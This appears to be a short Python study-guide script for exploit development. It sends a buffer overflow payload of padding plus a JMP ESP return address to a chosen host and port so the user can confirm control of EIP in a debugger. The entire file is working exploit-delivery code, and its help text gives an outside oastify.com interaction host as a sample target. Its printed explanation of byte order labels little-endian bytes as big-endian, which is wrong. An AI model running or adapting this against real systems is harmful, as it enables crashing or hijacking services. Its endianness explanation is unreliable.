#!/usr/bin/env python3
"""
Buffer Overflow - DLL Address Verification Script
================================================

This simplified script verifies that a specific DLL address (JMP ESP)
can be used to redirect execution in a buffer overflow exploit.

Author: CEH Study Guide
Purpose: Educational - DLL Address Testing
"""

import sys
import socket
import argparse

def test_dll_address(target_ip, target_port, offset, dll_address):
    """
    Test DLL address by sending payload with specific EIP value
    
    Args:
        target_ip (str): Target IP address
        target_port (int): Target port number
        offset (int): Buffer overflow offset
        dll_address (str): DLL address in hex format
    """
    try:
        # Convert hex address to bytes (little endian)
        addr_bytes = bytes.fromhex(dll_address.replace('\\x', ''))
        
        # Create payload: junk + DLL address
        junk = b"A" * offset
        payload = junk + addr_bytes
        
        print(f"[+] Testing DLL address: {dll_address}")
        print(f"[+] Target: {target_ip}:{target_port}")
        print(f"[+] Offset: {offset}")
        print(f"[+] Payload size: {len(payload)} bytes")
        
        # Send payload
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.connect((target_ip, target_port))
        conn.send(payload)
        conn.close()
        
        print(f"[+] Payload sent successfully!")
        print(f"[*] Check debugger to verify EIP control")
        print(f"[*] EIP should contain: {dll_address}")
        
    except Exception as e:
        print(f"[-] Error occurred: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="DLL Address Verification Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test default DLL address
  python3 verify_dll_address.py 127.0.0.1 8888
  
  # Test custom DLL address
  python3 verify_dll_address.py 192.168.1.100 9999 --offset 1052 --dll-addr "7B8AA968"
  
  # Test against target site (for educational demo)
  python3 verify_dll_address.py rnivqlhaedmb4yc3ezjzgji7xy3prff4.oastify.com 80
        """
    )
    
    parser.add_argument('target_ip', help='Target IP address or hostname')
    parser.add_argument('target_port', type=int, help='Target port number')
    parser.add_argument('--offset', type=int, default=1052,
                       help='Buffer overflow offset (default: 1052)')
    parser.add_argument('--dll-addr', default="7B8AA968",
                       help='DLL address in hex format (default: 7B8AA968)')
    
    args = parser.parse_args()
    
    print("="*50)
    print("DLL ADDRESS VERIFICATION TOOL")
    print("="*50)
    print(f"Original DLL Address: 68a98a7b (Little Endian)")
    print(f"Converted for exploit: \\x7b\\x8a\\xa9\\x68 (Big Endian)")
    print("="*50)
    
    test_dll_address(args.target_ip, args.target_port, 
                    args.offset, args.dll_addr)

if __name__ == "__main__":
    main()